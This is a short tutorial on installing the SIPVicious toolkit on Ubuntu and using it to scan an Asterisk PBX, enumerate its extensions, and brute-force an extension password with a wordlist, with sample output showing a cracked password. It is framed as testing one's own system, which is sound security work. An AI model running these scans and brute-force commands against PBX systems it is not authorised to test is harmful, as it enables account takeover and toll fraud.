# Sipvicious

## Introduction
Sipvicious is used to scan for a pbx and try to attack it.
We will go through the steps of installing sipvicious on Ubuntu and using it.
The purpose of this is to secure your asterisk installation.

## Install Sipvicious on Ubuntu
```bash
sudo apt-get install sipvicious
```

## Usage
We will go through the steps of finding and penetration testing our sip system.

### Scan for SIP system

```bash
svmap pbx.megaw.co.za
```

The output will be as follows:
```
+----------------------+---------------------+-------------+
| SIP Device           | User Agent          | Fingerprint |
+======================+=====================+=============+
| 102.145.163.239:5060 | Asterisk PBX 20.6.0 | disabled    |
+----------------------+---------------------+-------------+
```

### Identify Extensions
```bash
svwar 102.145.163.239
```
The output will be as follows:
```
+-----------+----------------+
| Extension | Authentication |
------------------------------
| 102       | reqauth        |
| 100       | reqauth        |
| 101       | noauth         |
+-----------+----------------+
```

### Brute force the password of an extension
!!! note
    You will need a passwords file and rename it to dictionary.txt
    
```bash
svcrack 102.145.163.239 -u 100 -d dictionary.txt
```
The output will be as follows:
```
+-----------+----------+
| Extension | Password |
------------------------
| 100       | 123      |
+-----------+----------+
```
